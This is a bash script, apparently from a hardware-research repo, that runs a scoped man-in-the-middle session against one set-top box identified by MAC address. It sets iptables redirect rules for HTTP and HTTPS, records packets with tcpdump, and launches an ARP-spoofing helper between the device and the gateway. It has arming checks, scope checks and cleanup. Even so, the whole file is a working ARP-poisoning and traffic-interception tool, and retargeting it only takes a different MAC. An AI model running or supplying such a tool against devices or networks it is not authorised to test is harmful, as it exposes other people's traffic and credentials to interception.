#!/usr/bin/env bash
# NET-CONFIG-005: targeted HTTP / HTTPS interceptor session
set -euo pipefail

IFACE="${IFACE:-enp5s0}"
TARGET_MAC="${TARGET_MAC:-68:15:90:6b:81:96}"
GATEWAY_IP="${GATEWAY_IP:-192.168.1.1}"
HTTP_PORT="${HTTP_PORT:-8080}"
HTTPS_PORT="${HTTPS_PORT:-8443}"
DURATION="${1:-180}"
ARM="${ALLOW_ARP_MITM:-NO}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
CAPTURES_DIR="${REPO_DIR}/captures"
mkdir -p "${CAPTURES_DIR}"

PCAP_FILE="${CAPTURES_DIR}/net-config-005.pcap"
HTTP_LOG="${CAPTURES_DIR}/net-config-005.log"
INTERCEPTOR_STDOUT="${CAPTURES_DIR}/http_interceptor_config005.log"
ARP_LOG="${CAPTURES_DIR}/arp_spoofer_config005.log"

die() {
    echo "[-] SAFETY ABORT: $*" >&2
    exit 2
}

[[ "${ARM}" == "YES" ]] || die "set ALLOW_ARP_MITM=YES only after reviewing the preflight output"

command -v ip >/dev/null || die "'ip' command not found"
command -v iptables >/dev/null || die "'iptables' command not found"
command -v tcpdump >/dev/null || die "'tcpdump' command not found"
[[ -e "/sys/class/net/${IFACE}" ]] || die "interface ${IFACE} does not exist"

HOST_MAC="$(cat "/sys/class/net/${IFACE}/address" | tr '[:upper:]' '[:lower:]')"
mapfile -t HOST_IPS < <(ip -o -4 addr show dev "${IFACE}" | awk '{print $4}' | cut -d/ -f1)

# Learn the STB IP from the exact hardware MAC. Never sweep or poison a range.
# Use both the kernel neighbour table and /proc/net/arp, then demand exactly one answer.
ping -c 1 -W 1 "${GATEWAY_IP}" >/dev/null 2>&1 || true
mapfile -t TARGET_IPS < <(
    {
        ip neigh show dev "${IFACE}" 2>/dev/null | awk -v mac="${TARGET_MAC,,}" 'tolower($5)==mac {print $1}'
        awk -v mac="${TARGET_MAC,,}" 'tolower($4)==mac {print $1}' /proc/net/arp 2>/dev/null
    } | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | sort -u
)

(( ${#TARGET_IPS[@]} == 1 )) || die "expected exactly one current IP for STB MAC ${TARGET_MAC}; found: ${TARGET_IPS[*]:-(none)}"
TARGET_IP="${TARGET_IPS[0]}"

for host_ip in "${HOST_IPS[@]:-}"; do
    [[ "${TARGET_IP}" != "${host_ip}" ]] || die "resolved STB IP ${TARGET_IP} is this computer"
done
[[ "${TARGET_IP}" != "${GATEWAY_IP}" ]] || die "resolved STB IP equals gateway"

# Learn the gateway MAC from the live LAN instead of trusting a stale hard-coded value.
GATEWAY_MAC="$(ip neigh show "${GATEWAY_IP}" dev "${IFACE}" 2>/dev/null | awk 'NF>=5 {print tolower($5); exit}')"
if [[ -z "${GATEWAY_MAC}" ]]; then
    ping -c 1 -W 1 "${GATEWAY_IP}" >/dev/null 2>&1 || true
    GATEWAY_MAC="$(ip neigh show "${GATEWAY_IP}" dev "${IFACE}" 2>/dev/null | awk 'NF>=5 {print tolower($5); exit}')"
fi
[[ -n "${GATEWAY_MAC}" ]] || die "could not resolve gateway MAC for ${GATEWAY_IP}"

[[ "${TARGET_MAC,,}" != "${HOST_MAC}" ]] || die "target MAC equals host MAC"
[[ "${GATEWAY_MAC}" != "${HOST_MAC}" ]] || die "gateway MAC equals host MAC"
[[ "${TARGET_MAC,,}" != "${GATEWAY_MAC}" ]] || die "target MAC equals gateway MAC"

ORIG_REDIRECT_ALL="$(sysctl -n net.ipv4.conf.all.send_redirects)"
ORIG_REDIRECT_IF="$(sysctl -n net.ipv4.conf."${IFACE}".send_redirects)"

echo "=== NET-CONFIG-005 SAFE PREFLIGHT ==="
echo "Interface : ${IFACE}"
echo "Host      : ${HOST_IPS[*]:-(no IPv4)} (${HOST_MAC})"
echo "STB       : ${TARGET_IP} (${TARGET_MAC,,})"
echo "Gateway   : ${GATEWAY_IP} (${GATEWAY_MAC})"
echo "Duration  : ${DURATION}s"
echo "Scope     : EXACT STB ONLY — no DHCP range poisoning"
echo "======================================"

CLEANED_UP=0
cleanup() {
    if [[ "${CLEANED_UP}" -eq 1 ]]; then
        return
    fi
    CLEANED_UP=1
    echo "[*] Cleaning up session..."

    if [[ -n "${HTTP_PID:-}" ]] && kill -0 "${HTTP_PID}" 2>/dev/null; then
        kill -TERM "${HTTP_PID}" 2>/dev/null || true
        wait "${HTTP_PID}" 2>/dev/null || true
    fi

    if [[ -n "${ARP_PID:-}" ]] && kill -0 "${ARP_PID}" 2>/dev/null; then
        kill -TERM "${ARP_PID}" 2>/dev/null || true
        wait "${ARP_PID}" 2>/dev/null || true
    fi

    if [[ -n "${TCPDUMP_PID:-}" ]] && kill -0 "${TCPDUMP_PID}" 2>/dev/null; then
        kill -TERM "${TCPDUMP_PID}" 2>/dev/null || true
        wait "${TCPDUMP_PID}" 2>/dev/null || true
    fi

    iptables -t nat -D PREROUTING -i "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -p tcp --dport 80 -j REDIRECT --to-ports "${HTTP_PORT}" 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -p tcp --dport 443 -j REDIRECT --to-ports "${HTTPS_PORT}" 2>/dev/null || true
    iptables -D FORWARD -i "${IFACE}" -o "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -j ACCEPT 2>/dev/null || true
    iptables -D FORWARD -i "${IFACE}" -o "${IFACE}" -d "${TARGET_IP}" -j ACCEPT 2>/dev/null || true

    sysctl -w "net.ipv4.conf.all.send_redirects=${ORIG_REDIRECT_ALL}" >/dev/null || true
    sysctl -w "net.ipv4.conf.${IFACE}.send_redirects=${ORIG_REDIRECT_IF}" >/dev/null || true

    echo "[*] Verifying LAN recovery..."
    if ping -c 2 -W 1 "${GATEWAY_IP}" >/dev/null 2>&1; then
        echo "[+] Gateway reachable after cleanup."
    else
        echo "[!] Gateway health check failed after cleanup." >&2
        echo "[!] Keep STB disconnected and power-cycle the router before further testing." >&2
    fi
}
trap cleanup EXIT INT TERM

sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null
sysctl -w "net.ipv4.conf.${IFACE}.send_redirects=0" >/dev/null

# Exact source MAC, exact target IP. No subnet-wide FORWARD rule.
iptables -I FORWARD 1 -i "${IFACE}" -o "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -j ACCEPT
iptables -I FORWARD 2 -i "${IFACE}" -o "${IFACE}" -d "${TARGET_IP}" -j ACCEPT

iptables -t nat -I PREROUTING 1 -i "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -p tcp --dport 80 -j REDIRECT --to-ports "${HTTP_PORT}"
iptables -t nat -I PREROUTING 2 -i "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -p tcp --dport 443 -j REDIRECT --to-ports "${HTTPS_PORT}"

python3 -u "${SCRIPT_DIR}/http_interceptor.py" "${HTTP_PORT}" "${HTTP_LOG}" "${HTTPS_PORT}" > "${INTERCEPTOR_STDOUT}" 2>&1 &
HTTP_PID=$!
sleep 1
kill -0 "${HTTP_PID}" 2>/dev/null || die "HTTP/HTTPS interceptor failed to start"

tcpdump -i "${IFACE}" -s 0 -nn -U -w "${PCAP_FILE}" "ether host ${TARGET_MAC}" >/dev/null 2>&1 &
TCPDUMP_PID=$!
sleep 1
kill -0 "${TCPDUMP_PID}" 2>/dev/null || die "tcpdump failed to start"

python3 "${SCRIPT_DIR}/arp_spoofer.py"     "${IFACE}" "${TARGET_IP}" "${TARGET_MAC}" "${GATEWAY_IP}" "${GATEWAY_MAC}" --armed     > "${ARP_LOG}" 2>&1 &
ARP_PID=$!
sleep 1
if ! kill -0 "${ARP_PID}" 2>/dev/null; then
    cat "${ARP_LOG}" >&2 || true
    die "targeted ARP redirector failed to start"
fi

echo "[+] NET-CONFIG-005 active for ${DURATION}s against STB ${TARGET_IP} only."
sleep "${DURATION}"
echo "[+] Bounded duration reached."
